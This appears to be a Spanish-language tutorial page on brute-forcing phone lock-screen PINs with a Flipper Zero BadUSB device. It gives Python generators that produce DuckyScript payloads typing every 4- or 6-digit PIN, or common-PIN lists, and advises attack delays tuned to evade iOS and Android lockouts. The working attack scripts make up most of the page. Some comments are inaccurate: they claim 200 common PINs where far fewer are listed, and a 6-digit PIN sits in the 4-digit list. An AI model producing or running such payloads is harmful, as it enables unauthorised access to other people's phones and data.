
# Bruteforce de Pins

## <mark style="color:orange;">Mi repositorio de payloads</mark>

Podemos usar mi repositorio donde tengo subidos payloads para 4 y 6 pines. Solamente tendríamos que descargarnos los payloads dentro de la carpeta de Bad USB:

{% embed url="<https://github.com/afsh4ck/Flipper-Zero-BadUSB-Pin-Bruteforce>" %}

## <mark style="color:orange;">Generador de Payloads en Python</mark>

Podemos utilizar los siguientes scripts en python para personalizar los payloads a nuestro gusto.

### Pins de 4 dígitos

El siguiente script genera un payload para pins de 4 dígitos:

```python
# Generador de DuckyScript para fuerza bruta de PINs
with open("bruteforce_4digit_pin.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")
    for pin in range(10000):  # PINs de 0000 a 9999
        f.write(f"STRING {pin:04d}\n")  # Escribe el PIN con ceros iniciales
        f.write("ENTER\n")
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos
```

### Pins de 6 dígitos

El siguiente script genera un payload para pins de 6 dígitos:

```python
# Generador de DuckyScript para fuerza bruta de PINs de 6 dígitos
with open("bruteforce_6digit_pin.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in range(1000000):  # PINs de 000000 a 999999
        f.write(f"STRING {pin:06d}\n")  # Escribe el PIN con ceros iniciales
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

## <mark style="color:orange;">Generador de Pins Comunes en Python</mark>

### Pins de 4 dígitos

El siguiente script genera un payload con los 200 pins más comunes de 4 dígitos:

```python
# Generador de DuckyScript para bruteforce de PINs comunes de 4 dígitos

# Lista inicial de PINs más comunes
common_pins = [
    "1234", "1111", "0000", "1212", "7777", "1004", "2000", "4444", "2222", 
    "6969", "9999", "3333", "5555", "6666", "1122", "1313", "8888", "4321", 
    "1010", "2580", "2019", "1987", "1980", "2468", "1357", "9876", "123456"
]

# Crear archivo DuckyScript
with open("brute_common_4pins.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in common_pins:
        f.write(f"STRING {pin}\n")  # Escribe el PIN más usado o generado
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

### Pins de 6 dígitos

El siguiente script genera un payload con los 200 pins más comunes de 6 dígitos:

```python
# Generador de DuckyScript para bruteforce de PINs comunes de 6 dígitos

# Lista inicial con los PINs comunes, eliminando duplicados
pins = [
    "123456", "654321", "111111", "000000", "222222", "333333", "444444", 
    "555555", "666666", "777777", "888888", "999999", "121212", "112233", 
    "123123", "101010", "123321", "789456", "147258", "111222", "696969", 
    "000123", "222333", "333444", "123654", "654123", "112211", "223344", 
    "445566", "556677", "667788", "778899", "121121", "343434", "565656", 
    "787878", "909090", "098765", "567890", "456789", "345678", "234567", 
    "987654", "876543", "765432", "210987", "110110", "314159", "271828", 
    "141421"
]

# Crear archivo DuckyScript
with open("brute_common_6pins.txt", "w") as f:
    f.write("DEFAULT_DELAY 2000\n")  # Tiempo inicial de estabilización
    for pin in pins:
        f.write(f"STRING {pin}\n")  # Escribe el PIN
        f.write("ENTER\n")  # Simula presionar Enter
        f.write("DELAY 5000\n")  # Pausa para evitar bloqueos de intentos rápidos
```

## <mark style="color:orange;">Limitaciones y recomendaciones</mark>

### **1. Bloqueos y límites en iOS**

* **Intentos Fallidos**:
  * iOS tiene un sistema de bloqueo progresivo después de varios intentos fallidos.
  * Por defecto:
    * **5 intentos fallidos**: Bloqueo temporal de 1 minuto.
    * **6 intentos fallidos**: Bloqueo de 5 minutos.
    * **7 intentos fallidos**: Bloqueo de 15 minutos.
    * **8 intentos fallidos o más**: Bloqueos de 1 hora.
  * Si la opción "Borrar datos" está habilitada, el dispositivo se restablecerá después de **10 intentos fallidos**.
* **Automatización con un teclado HID**:
  * iOS trata las entradas HID como si fueran manuales, pero el comportamiento de bloqueo sigue siendo el mismo.

### **2. Bloqueos y límites en Android**

Dependiendo de la antigüedad del S.O. son más o menos restrictivos:

* **Versiones antiguas (< Android 6.0)**:
  * Menos restricciones en los intentos fallidos; algunos dispositivos permitían intentos infinitos si no se habilitaban medidas adicionales.
* **Versiones modernas (Android 10+)**:
  * Implementación más robusta de límites progresivos y bloqueos automáticos, integrados con funciones de seguridad como **FRP (Factory Reset Protection)** para proteger el dispositivo contra el acceso no autorizado.

### **3. Tiempo de espera Recomendado**

Para evitar estos bloqueos, considera los siguientes intervalos:

* **Intentos por minuto**: No más de 5 intentos (un intento cada 12 segundos).
* **DELAY sugerido**:
  * Mínimo: **12000 ms** (12 segundos).
  * Recomendado: **15000 ms** (15 segundos), para dar tiempo adicional y simular comportamiento humano.

### **4. Cálculo del tiempo Total**

Si estás probando **todas las combinaciones de un PIN de 6 dígitos (1,000,000 combinaciones)** con un retraso de **15 segundos** entre cada intento:

```
1,000,000 × 15 segundos = 15,000,000 segundos = 173.6 dias
```

Esto hace que sea inviable realizar fuerza bruta en dispositivos iOS modernos con un pin de 6 dígitos, ya que los tiempos de espera y bloqueos hacen que el proceso sea extremadamente lento.
